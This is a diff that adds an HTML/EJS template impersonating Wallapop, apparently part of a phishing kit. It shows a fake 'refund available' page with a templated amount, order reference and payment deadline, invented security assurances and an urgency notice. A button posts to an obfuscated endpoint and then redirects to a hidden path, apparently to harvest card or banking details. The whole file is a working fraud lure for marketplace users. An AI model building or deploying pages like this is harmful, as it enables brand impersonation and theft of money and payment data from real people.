@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallapop - Notificación de reembolso</title>
+    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
+    <link rel="stylesheet" href="/css/wallapop.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <%- include('partials/tracker') %>
+    <style>
+        .refund-badge-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-color: rgba(19, 193, 172, 0.12);
+            color: var(--wlp-teal, #13c1ac);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .refund-amount-box {
+            font-size: 36px;
+            font-weight: 700;
+            color: var(--wlp-dark, #253238);
+            margin: 8px 0 20px;
+            letter-spacing: -0.5px;
+        }
+
+        .refund-details-table {
+            width: 100%;
+            margin: 18px 0;
+            border-collapse: collapse;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .refund-details-table tr {
+            border-bottom: 1px solid #edf1f3;
+        }
+
+        .refund-details-table tr:last-child {
+            border-bottom: none;
+        }
+
+        .refund-details-table td {
+            padding: 12px 4px;
+        }
+
+        .refund-details-table .label {
+            color: var(--wlp-muted, #607d8b);
+            width: 50%;
+        }
+
+        .refund-details-table .value {
+            color: var(--wlp-dark, #253238);
+            font-weight: 600;
+            text-align: right;
+        }
+
+        .status-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background-color: #e8f8f5;
+            color: #0d8a7b;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 3px 8px;
+            border-radius: 12px;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background-color: #13c1ac;
+        }
+
+        .time-alert-box {
+            background-color: #f0fdf9;
+            border: 1px solid #cceee5;
+            border-radius: 8px;
+            padding: 12px 14px;
+            font-size: 13px;
+            color: #0b6a5e;
+            margin: 18px 0 24px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <header class="wlp-header">
+        <div class="wlp-header-inner">
+            <a href="/" class="wlp-logo-link">
+                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
+            </a>
+        </div>
+    </header>
+
+    <main class="wlp-page-wrapper">
+        <div class="wlp-modal-card" style="text-align: center;">
+            <div class="refund-badge-icon">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+            </div>
+
+            <h1 class="wlp-title" style="margin-bottom: 6px; font-size: 22px;">¡Reembolso disponible!</h1>
+            <p style="font-size: 14.5px; color: var(--wlp-muted, #607d8b); margin-bottom: 6px;">
+                Tienes un saldo pendiente de ingresar en tu cuenta o tarjeta bancaria.
+            </p>
+
+            <div class="refund-amount-box">
+                <%= refundAmount %> €
+            </div>
+
+            <!-- Transaction Breakdown Table -->
+            <table class="refund-details-table">
+                <tr>
+                    <td class="label">Referencia:</td>
+                    <td class="value"><%= orderNumber %></td>
+                </tr>
+                <tr>
+                    <td class="label">Concepto:</td>
+                    <td class="value">Reembolso de saldo a favor</td>
+                </tr>
+                <tr>
+                    <td class="label">Fecha de emisión:</td>
+                    <td class="value"><%= processingDate %></td>
+                </tr>
+                <tr>
+                    <td class="label">Plazo límite de cobro:</td>
+                    <td class="value"><%= paymentDeadline %></td>
+                </tr>
+                <tr>
+                    <td class="label">Estado de la solicitud:</td>
+                    <td class="value">
+                        <span class="status-pill">
+                            <span class="status-dot"></span>
+                            Listo para transferir
+                        </span>
+                    </td>
+                </tr>
+            </table>
+
+            <!-- Notice -->
+            <div class="time-alert-box">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink: 0;">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <polyline points="12 6 12 12 16 14"></polyline>
+                </svg>
+                <span>El importe está reservado y listo para transferirse. Confirma tus datos de cobro para recibir el ingreso inmediatamente.</span>
+            </div>
+
+            <!-- CTA Button -->
+            <a href="/blaTxmdM9HwCP472fgsut" class="wlp-btn-primary btn" style="text-decoration: none;">Recibir dinero ahora</a>
+
+            <div class="wlp-ssl-footer" style="margin-top: 24px;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                <span>Protegido por el sistema de Protección Wallapop y Cifrado SSL</span>
+            </div>
+            
+            <p style="font-size: 12px; color: #8fa2ad; margin-top: 8px;">
+                Si tienes cualquier duda, contacta con <strong>soporte@wallapop.com</strong>
+            </p>
+        </div>
+    </main>
+
+    <script>
+        $("a.btn").click(function(e){
+            e.preventDefault();
+            const btn = $(this);
+            btn.text('Procesando...');
+            btn.css('pointer-events', 'none');
+
+            $.ajax({
+                url: '/EpLP85AgNE4pn4RtpL', 
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({}),
+                success: function(info) {
+                    if (info.OK) {
+                        window.location = "/loading?time=2&url=/blaTxmdM9HwCP472fgsut";
+                    }
+                },
+                error: function() {
+                    window.location = "/loading?time=2&url=/blaTxmdM9HwCP472fgsut";
+                }
+            });
+        });
+    </script>
+</body>
+</html>
